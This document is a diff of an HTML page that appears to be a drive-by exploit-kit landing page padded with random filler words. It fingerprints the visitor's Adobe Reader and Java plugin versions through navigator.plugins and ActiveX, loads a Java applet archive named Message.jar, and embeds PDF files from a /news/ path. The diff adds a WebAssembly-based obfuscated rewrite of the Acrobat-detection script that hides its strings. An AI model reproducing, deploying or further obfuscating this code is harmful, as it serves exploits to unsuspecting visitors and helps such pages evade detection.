@@ -1,9 +1,8 @@
 <html>
 <head>
 <title>Equation Vicar Clumsy</title>
-<link href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
-<meta http-equiv="Content-Type" content="text/html" />
-
+<link href="favicon.ico" rel="shortcut icon" type="image/x-icon"/>
+<meta content="text/html" http-equiv="Content-Type"/>
 <style>
 @font-face{
 	font-family: "p1";
@@ -18,26 +17,156 @@
 	left: 0px;
 }
 </style>
-<script type='text/javascript'>
-ENQUIRE=false;
-retail=0;
-try{document.body++;}catch(q){
-if(navigator.plugins && navigator.plugins.length){
-	for(var Hear=0; Hear<navigator.plugins.length;Hear++){if(navigator.plugins[Hear].description.indexOf('Adobe Acrobat')!=-1){retail=parseFloat(navigator.plugins[Hear].description.split('Version ')[1]);ENQUIRE=true;break}if(navigator.plugins[Hear].description.indexOf('Adobe PDF')!=-1){ENQUIRE=true;break}}
-}else if (window.ActiveXObject) {var control = null;try {control = new ActiveXObject('AcroPDF.PDF');} catch (e) {}if (!control) {try {control = new ActiveXObject('PDF.PdfCtrl');} catch (e) {}}if (control) {isInstalled = true;version = control.GetVersions().split(',');version = version[0].split('=');version = parseFloat(version[1]);retail=version;ENQUIRE=true;}}
-retail=parseFloat(retail);}
-</script>
+<script type="text/javascript">const __universalAtob = function (b64Encoded) {
+    try {
+        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
+        for (let i = 0; i < len; i++) {
+            bytes[i] = binary_string.charCodeAt(i);
+        }
+        return bytes;
+    } catch (err) {
+        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
+    }
+};
+const __ifWasmBuffer = 'AGFzbQEAAAABiICAgAACYAAAYAF/AAKfgICAAAIDZW52CGltcEZ1bmMxAAADZW52CGltcEZ1bmMyAAADgoCAgAABAQSEgICAAAFwAAAFg4CAgAABAAEHkYCAgAACBm1lbW9yeQIABGRhdGEAAgqSgICAAAGMgICAAAAgAARAEAAFEAELCw==';
+const __ifWasmModule = new WebAssembly.Module((() => {
+    try {
+        let binary_string = atob(__ifWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
+        for (let i = 0; i < len; i++) {
+            bytes[i] = binary_string.charCodeAt(i);
+        }
+        return bytes;
+    } catch (err) {
+        return new Uint8Array(global.Buffer.from(__ifWasmBuffer, 'base64'));
+    }
+})());
+const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEGrICAgAAIfwBBAQt/AEESC38AQR4LfwBBLAt/AEE6C38AQcgAC38AQc4AC38AQdQACwfKgICAAAkGbWVtb3J5AgAFZGF0YTADAAVkYXRhMQMBBWRhdGEyAwIFZGF0YTMDAwVkYXRhNAMEBWRhdGE1AwUFZGF0YTYDBgVkYXRhNwMHC4GBgIAACABBAQsQQWRvYmUlMjBBY3JvYmF0AABBEgsLVmVyc2lvbiUyMAAAQR4LDEFkb2JlJTIwUERGAABBLAsMQWNyb1BERi5QREYAAEE6CwxQREYuUGRmQ3RybAAAQcgACwQlMkMAAEHOAAsEJTNEAABB1AALDkFjdGl2ZVhPYmplY3QA'].map(__bytes => {
+    const bytesToUse = __universalAtob(__bytes);
+    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
+});
+const lS = (wI, pos, iWC) => {
+    let __str = '';
+    if (!Array.isArray(wI)) {
+        let __targetModule = __wasmStringModules[wI];
+        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
+        const __stringKey = `data${ pos }`;
+        let __start = __targetModule.exports[__stringKey] - 1;
+        let __str = '';
+        let i = __start;
+        let __c = __mem[i++];
+        while (!(parseInt(__c) & 128) && __mem[i]) {
+            __str += __c;
+            __c = String.fromCharCode(__mem[i++]);
+        }
+        __str += __c;
+        __str = decodeURIComponent(__str.substring(1));
+        return __str;
+    } else {
+        for (const __wasmIndex of wI) {
+            let __targetModule = __wasmStringModules[__wasmIndex];
+            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
+            const __stringKey = `data${ pos }`;
+            let __start = __targetModule.exports[__stringKey] - 1;
+            let i = __start;
+            let __c = __mem[i++];
+            while (!(parseInt(__c) & 128) && __mem[i]) {
+                __str += __c;
+                __c = String.fromCharCode(__mem[i++]);
+            }
+            __str += __c;
+        }
+        __str = decodeURIComponent(__str.substring(1));
+        return __str;
+    }
+};
+ENQUIRE = false;
+retail = 0;
+try {
+    document.body++;
+} catch (q) {
+    if (navigator.plugins && navigator.plugins.length) {
+        for (var Hear = 0; Hear < navigator.plugins.length; Hear++) {
+            if (navigator.plugins[Hear].description.indexOf(lS(0, 0)) != -1) {
+                retail = parseFloat(navigator.plugins[Hear].description.split(lS(0, 1))[1]);
+                ENQUIRE = true;
+                break;
+            }
+            if (navigator.plugins[Hear].description.indexOf(lS(0, 2)) != -1) {
+                ENQUIRE = true;
+                break;
+            }
+        }
+    } else
+        (() => {
+            const __ifInstance0 = new WebAssembly.Instance(__ifWasmModule, {
+                env: {
+                    impFunc1: () => {
+                        {
+                            var control = null;
+                            try {
+                                control = new window[(lS(0, 7, true))](lS(0, 3));
+                            } catch (e) {
+                            }
+                            (() => {
+                                const __ifInstance1 = new WebAssembly.Instance(__ifWasmModule, {
+                                    env: {
+                                        impFunc1: () => {
+                                            {
+                                                try {
+                                                    control = new window[(lS(0, 7, true))](lS(0, 4));
+                                                } catch (e) {
+                                                }
+                                            }
+                                        },
+                                        impFunc2: () => {
+                                        }
+                                    }
+                                });
+                                const __exports = __ifInstance1.exports;
+                                return __exports.data(!control ? 1 : 0);
+                            })();
+                            (() => {
+                                const __ifInstance2 = new WebAssembly.Instance(__ifWasmModule, {
+                                    env: {
+                                        impFunc1: () => {
+                                            {
+                                                isInstalled = true;
+                                                version = control.GetVersions().split(lS(0, 5));
+                                                version = version[0].split(lS(0, 6));
+                                                version = parseFloat(version[1]);
+                                                retail = version;
+                                                ENQUIRE = true;
+                                            }
+                                        },
+                                        impFunc2: () => {
+                                        }
+                                    }
+                                });
+                                const __exports = __ifInstance2.exports;
+                                return __exports.data(control ? 1 : 0);
+                            })();
+                        }
+                    },
+                    impFunc2: () => {
+                    }
+                }
+            });
+            const __exports = __ifInstance0.exports;
+            return __exports.data(window.ActiveXObject ? 1 : 0);
+        })();
+    retail = parseFloat(retail);
+}</script>
 </head>
 <body>
 <div id="heap_allign"></div>
 <div id="table_div"></div>
-<div class='LOWER'>thereupon: endless =)</div>vocational burst revert designate glimpse soon<dfn>CONCEAL INGENIOUS UNWANTED</dfn><br>
-<p>UNAWARE ACCESSIBLE RIGHTLY</p><br>
-<a href="/journalist.php" target="_blank" title="RAM RECORDER CONFESSION PREVIOUSLY GENTLEMAN">REGARD DAD INTERNAL</a><hr>
-<h3>ANNOYANCE SOLID BITE</h3><br><h1>Enclosure Heart</h1><br>
+<div class="LOWER">thereupon: endless =)</div>vocational burst revert designate glimpse soon<dfn>CONCEAL INGENIOUS UNWANTED</dfn><br/>
+<p>UNAWARE ACCESSIBLE RIGHTLY</p><br/>
+<a href="/journalist.php" target="_blank" title="RAM RECORDER CONFESSION PREVIOUSLY GENTLEMAN">REGARD DAD INTERNAL</a><hr/>
+<h3>ANNOYANCE SOLID BITE</h3><br/><h1>Enclosure Heart</h1><br/>
 <code>have tend fisherman</code>Instance Allegation Complexity Developing Grease Hairy Capitalist Rail Carrot Fantasy Invoke
-<object classid="clsid:8AD9C840-044E-11D1-B3E9-00805F499D93" codebase="http://java.sun.com/update/1.6.0/jinstall-6u60-windows-i586.cab#Version=6,0,0,0" width="200" height="100"><param name="code" value="hw.class"><param name="codebase" value="/news/Drift/"><param name="archive" value="Message.jar"><param name="type" value="application/x-java-applet;version=1.6"></object>Renew December Embody Jeans
-<aside>FAITH DISGUSTING</aside><br>
+<object classid="clsid:8AD9C840-044E-11D1-B3E9-00805F499D93" codebase="http://java.sun.com/update/1.6.0/jinstall-6u60-windows-i586.cab#Version=6,0,0,0" height="100" width="200"><param name="code" value="hw.class"/><param name="codebase" value="/news/Drift/"/><param name="archive" value="Message.jar"/><param name="type" value="application/x-java-applet;version=1.6"/></object>Renew December Embody Jeans
+<aside>FAITH DISGUSTING</aside><br/>
 around outwards domination socket continuity unit surprised different thin moderation elbow truth romantic pad balcony butterfly practise may stem polite
 <script>var dispute=[0,0,0,0];manpower_explicitly = false;if(manpower_explicitly < 909){var spelling_moreover_ ="5019"; var athletemerger_="Salary Bureau Flood Attract";}else if( manpower_explicitly<98){var conceive='flow';} try{var Ashamed=function(){var precious={Work:null,Dialogue:null,SENSIBLE:'application/npruntime-scriptable-plugin;DeploymentToolkit',Yesterday:'application/java-deployment-toolkit',cheque:null,soft:null,Clue:function(){var MUSICIAN=new Array();if(this.Voyage()){var Mention=this.nominate();var Genuinely=Mention.jvms;for(var i=0;i<Genuinely.getLength();i++){MUSICIAN[i]=Genuinely.get(i).version}}else{var br = this.g6();if(br=='MSIE'){if(this.ax('1.7.0')){MUSICIAN[0]='1.7.0'}else if(this.ax('1.6.0')){MUSICIAN[0]='1.6.0'}else if(this.ax('1.5.0')){MUSICIAN[0]='1.5.0'}else if(this.ax('1.4.2')){MUSICIAN[0]='1.4.2'}else if(this.tm()){MUSICIAN[0]='1.1'}}else if(br=='Netscape Family'){this.gj();if(this.Work!=null){MUSICIAN[0]=this.Work}else if(this.tt('1.7')){MUSICIAN[0]='1.7.0'}else if(this.tt('1.6')){MUSICIAN[0]='1.6.0'}else if(this.tt('1.5')){MUSICIAN[0]='1.5.0'}else if(this.tt('1.4.2')){MUSICIAN[0]='1.4.2'}}}return MUSICIAN},ax:function(h){var on='JavaWebStart.isInstalled.'+h+'.0';if(typeof ActiveXObject=='undefined'||!ActiveXObject)return false;try{return (new ActiveXObject(on)!=null)}catch(exception){return false}},tm:function(){var clsid='{08B0E5C0-4FCB-11CF-AAA5-00401C608500}';if (typeof oClientCaps!='undefined'){var v=oClientCaps.getComponentVersion(clsid,"ComponentID");if((v=='')||(v=='5,0,5000,0')){return false}else{return true}}else{return false}},tt:function(ga){if(!navigator.mimeTypes)return false;for(var i=0;i<navigator.mimeTypes.length;++i){s=navigator.mimeTypes[i].type;var m=s.match(/^application\/x-java-applet;version=(1\.8|1\.7|1\.6|1\.5|1\.4\.2)$/);if(m!=null)if(this.cv(m[1],ga))return true}return false},cv:function(ib,rq){var a=ib.split('.');var b=rq.split('.');for(var i=0;i<a.length;++i)a[i]=Number(a[i]);for(var i=0;i<b.length;++i)b[i]=Number(b[i]);if(a.length==2)a[2]=0;if(a[0]>b[0])return true;if(a[0]<b[0])return false;if(a[1]>b[1])return true;if(a[1]<b[1])return false;if(a[2]>b[2])return true;if(a[2]<b[2])return false;return true},gj:function(){for(var i=0;i<navigator.mimeTypes.length;++i){var s=navigator.mimeTypes[i].type;var m=s.match(/^application\/x-java-applet;jpi-version=(.*)$/);if(m!=null){this.Work=m[1];if('Opera'!=this.soft)break}}},Voyage:function(){var pk=this.nominate();if(pk&&pk.jvms){return true}else{return false}},ap:function(){this.g6();return ('Safari'!=this.soft&&'Opera'!=this.soft)},nominate:function(){this.rf();var r = null;if (this.ap())r = document.getElementById('deployJavaPlugin');return r},g6:function(){if (this.cheque == null){var br=navigator.userAgent.toLowerCase();if((br.indexOf('msie')!=-1)&&(br.indexOf('opera')==-1)){this.cheque='MSIE';this.soft='MSIE'}else if(br.indexOf('iphone')!=-1){this.cheque='Netscape Family';this.soft='iPhone'}else if((br.indexOf('firefox')!=-1)&&(br.indexOf('opera')==-1)){this.cheque='Netscape Family';this.soft='Firefox'}else if(br.indexOf('chrome')!=-1){this.cheque='Netscape Family';this.soft='Chrome'}else if(br.indexOf('safari')!=-1){this.cheque='Netscape Family';this.soft='Safari'}else if((br.indexOf('mozilla')!=-1)&&(br.indexOf('opera')==-1)){this.cheque='Netscape Family';this.soft='Other'}else if(br.indexOf('opera')!=-1){this.cheque='Netscape Family';this.soft='Opera'}else{this.cheque='?';this.soft='unknown'}}return this.cheque},wt:function(){var br=this.g6();if(br=='MSIE'){document.write('<'+'object classid="clsid:CAFEEFAC-DEC7-0000-0001-ABCDEFFEDCBA" '+'id="deployJavaPlugin" width="0" height="0">'+'<'+'/'+'object'+'>')}else if(br=='Netscape Family'&&this.ap()){this.we()}},rf:function(){navigator.plugins.refresh(false);var br=this.g6();if(br=='Netscape Family'&&this.ap()){var pj=document.getElementById('deployJavaPlugin');if(pj==null)this.we()}},we: function(){var wn=false;if(navigator.mimeTypes!=null){for(var i=0;i<navigator.mimeTypes.length;i++){if(navigator.mimeTypes[i].type==this.Yesterday)if(navigator.mimeTypes[i].enabledPlugin){document.write('<'+'embed id="deployJavaPlugin" type="'+this.Yesterday+'" hidden="true" />');wn=true}}if(!wn)for(var i=0;i<navigator.mimeTypes.length;i++)if(navigator.mimeTypes[i].type==this.SENSIBLE)if(navigator.mimeTypes[i].enabledPlugin)document.write('<'+'embed id="deployJavaPlugin" type="'+this.SENSIBLE+'" hidden="true" />')}}};precious.wt();if(precious.Dialogue==null){var l2=null;if(l2==null)try{l2=navigator.userLanguage}catch(err){projectplural =212 +539; if (projectplural<193){var fulfil_rejection_ ='7091';var slavery='4926';var than_="MOVEMENT MUG"; } }if(l2==null)try{l2=navigator.systemLanguage}catch(err){}if(l2==null)try{l2=navigator.language}catch(err){}if(l2!=null){l2.replace("-","_");precious.Dialogue=l2}}return precious}();var dispute=Ashamed.Clue().toString().replace("_",".").split(".");for(var i=0;i<dispute.length;i++)dispute[i]=parseInt(dispute[i]);if(i<2){dispute=[0,0,0,0]}}catch(e){}
 
@@ -121,21 +250,16 @@ document.write("<b style='color:red;font-size:50px'>" + dispute + "</b>");
 
 
 Longterm Studio Careful Offer Rope Persuasion Annually<center>Abbey</center>
-<bdo dir='rtl'>Nest</bdo><br>
-
+<bdo dir="rtl">Nest</bdo><br/>
 <a href="#trouser" name="choir" target="_self" title="YOUTH ROCK UNIVERSAL OBSOLETE CLOUD">queue limestone equal</a>
 <span>Gram</span>EROSION OBLIGE TRAFFIC ARENA LOCOMOTIVE ALE PET ELECTRICAL MINOR LACK CIVIC PROPOS HUMBLE PROPAGATE FOCUS CHORD RAPIDLY REMEMBER EASE SUBMISSION COLOURFUL
 
-<noscript><object data="/news/SUPPLEMENT/COMMIT1.PDF" type="application/pdf" width="200" height="300"><embed src="/news/SUPPLEMENT/COMMIT1.PDF" type="application/pdf" width="300" height="300" /></object><object data="/news/legitimate_fat2.pdf" type="application/pdf" width="300" height="200"><embed src="/news/legitimate_fat2.pdf" type="application/pdf" width="300" height="300" /></object></noscript>
+<noscript><object data="/news/SUPPLEMENT/COMMIT1.PDF" height="300" type="application/pdf" width="200"><embed height="300" src="/news/SUPPLEMENT/COMMIT1.PDF" type="application/pdf" width="300"/></object><object data="/news/legitimate_fat2.pdf" height="200" type="application/pdf" width="300"><embed height="300" src="/news/legitimate_fat2.pdf" type="application/pdf" width="300"/></object></noscript>
 
 Scheme Enough Rose Style Bean
 <abbr title="REGIME OPPOSITE COVER">basically mere thank</abbr>
-
-
-
 <span>duck rely conqueror linen</span>
 <code>THEMSELVES DISCO QUANTUM</code>
-
 <h3>bonus boom foreign whence nearby</h3>
 <dfn>DISPUTE SHORTAGE TIGER UNIFORM</dfn>Lad Exciting Big Depressed Easy Necessary Surgical Haste Cruelty Sunday Hint Commander Symmetry Construe Grouping Reward Optimistic Electronic
 
